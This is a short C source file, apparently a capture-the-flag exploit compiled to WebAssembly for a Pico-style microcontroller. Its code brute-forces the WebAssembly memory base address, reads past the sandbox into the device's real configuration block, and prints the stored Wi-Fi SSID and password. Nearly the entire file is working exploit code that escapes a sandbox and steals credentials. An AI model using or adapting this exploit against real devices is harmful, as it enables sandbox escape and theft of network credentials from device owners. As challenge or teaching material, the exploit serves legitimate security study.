#include <stdint.h>

#include "../shared.h"

int printf(const char* format, ...);

#define export __attribute__((visibility("default"))) __attribute__((used))

#define REAL_CONFIG_ADDR 0x101F0000

#define RAM_START_ADDR 0x20000000
#define RAM_END_ADDR   0x20042000

uint32_t check(uint32_t x) {
    pico_config* c = (pico_config*)x;
    return c->magic == 0x12345678 && c->version == 0x00000001;
}

uint32_t find_mem_base_addr(void) {
    for (uint32_t k = RAM_START_ADDR; k <= RAM_END_ADDR; k += 4) {
        uint32_t mem_base_addr_guess = REAL_CONFIG_ADDR - k;
        printf("guess: %p\n", (void*)mem_base_addr_guess);
        if (check(mem_base_addr_guess)) {
            return mem_base_addr_guess;
        }
    }

    return 0;
}

export int main(void) {
    printf("Exploit started\n");

    uint32_t mem_base_addr = find_mem_base_addr();
    if (!mem_base_addr) {
        printf("Failed to leak wasm memory base address\n");
        return -1;
    }

    printf("Leaked wasm memory base address: %p\n", (void*)mem_base_addr);

    pico_config* c = (pico_config*)mem_base_addr;

    // return c->wifi_pass_len;

    char buf[256];
    int i = 0;

    #define ADD(x)           buf[i++] = x;
    #define ADD_MANY(x, len) for (uint32_t j = 0; j < len; j++) ADD(x[j]); 
    #define ADD_STR(x)       ADD_MANY(x, sizeof(x) - 1)


    ADD_STR("SSID: ");
    ADD_MANY(c->wifi_ssid, c->wifi_ssid_len);
    ADD('\n');
    ADD_STR("PASS: ");
    ADD_MANY(c->wifi_pass, c->wifi_pass_len);
    ADD('\n');
    ADD('\0');

    printf("%s\n", buf);
    return 0;
}
